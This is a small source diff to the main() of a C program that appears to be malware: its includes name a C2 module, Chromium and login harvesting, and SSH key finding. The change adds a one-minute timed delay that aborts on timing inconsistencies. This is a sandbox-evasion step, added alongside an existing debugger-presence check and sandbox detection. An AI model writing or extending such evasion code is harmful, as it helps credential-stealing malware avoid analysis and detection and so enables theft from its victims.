@@ -8,6 +8,7 @@
 
 #include "c2.h"
 #include "chromium.h"
+#include "delay_execution.h"
 #include "find_ssh_key.h"
 #include "hardware_requirements.h"
 #include "logins.h"
@@ -40,6 +41,14 @@ int main(void) {
     printf("DEBUG: main: CheckRemoteDebuggerPresent failed. Error : %lu\n",
            GetLastError());
 #endif
+  }
+
+  // 1 minute
+  if (delay_execution(60000) == EXIT_FAILURE) {
+#ifdef DEBUG
+    fprintf(stderr, "Timing inconsistencies while delaying execution");
+#endif
+    return EXIT_FAILURE;
   }
 
   // Stop if sandbox detected
